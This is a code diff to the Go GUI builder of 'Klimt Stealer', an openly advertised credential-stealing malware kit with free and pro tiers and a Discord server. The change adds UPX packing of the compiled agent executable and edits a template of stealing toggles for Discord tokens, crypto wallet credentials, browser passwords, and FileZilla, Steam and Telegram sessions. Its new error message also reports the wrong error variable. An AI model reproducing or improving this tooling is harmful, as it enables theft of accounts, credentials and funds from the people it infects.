@@ -6,15 +6,15 @@
 package main
 
 import (
-	"os"
+	"encoding/base64"
 	"fmt"
+	"image/color"
 	"math"
 	"net/url"
+	"os"
 	"os/exec"
 	"strconv"
 	"strings"
-	"image/color"
-	"encoding/base64"
 
 	"fyne.io/fyne/v2/app"
 	"fyne.io/fyne/v2/container"
@@ -40,7 +40,7 @@ func main() {
 	window := app.NewWindow("Klimt Builder - Free Version")
 
 	// Create YHWH Discord hyperlink that open the Discord URL using the default browser
-	discordURL, _ := url.Parse("https://discord.gg/GMPfKuR3Tn")
+	discordURL, _ := url.Parse("https://discord.gg/GBjpS3ENGK")
 	discordHyperlink := widget.NewHyperlink("Join the Klimt Stealer Discord Server!", discordURL)
 
 	// Create input boxes
@@ -194,7 +194,18 @@ func main() {
 			cmd := exec.Command("go", "build", "-o", "build/agent.exe", "./agent")
 			cmd.Stdout = os.Stdout
 			cmd.Stderr = os.Stderr
+			cmd2 := exec.Command("build/upx.exe", "build/agent.exe")
+			cmd2.Stdout = os.Stdout
+			cmd2.Stderr = os.Stderr
 			err := cmd.Run()
+			err2 := cmd2.Run()
+			if err2 != nil {
+				popup := dialog.NewInformation("Builder", fmt.Sprintf("Compression Failed!\nError: %e", err), window)
+				popup.Show()
+			} else {
+				popup := dialog.NewInformation("Builder", "Compression Succesful!", window)
+				popup.Show()
+			}
 			if err != nil {
 				popup := dialog.NewInformation("Builder", fmt.Sprintf("Build Failed!\nError: %e", err), window)
 				popup.Show()
@@ -204,7 +215,6 @@ func main() {
 			}
 		}()
 	})
-
 
 	// Create a container to hold the input boxes and button
 	content := container.NewVBox(
@@ -264,7 +274,7 @@ var injectIntoBrowsers = %s // Pro Version
 // enable/disable heavy-load stealing functions (can increase program runtime considerably)
 var getDiscordTokens = %s
 var getWalletCredentials = %s
-var getBrowserCredentials = %s // Pro Version
+var getBrowserCredentials = %s // Pro Version (Free Version only has Password Stealing!)
 var getFileZillaServers = %s // Pro Version
 var getSteamSession = %s // Pro Version
 var getTelegramSession = %s // Pro Version
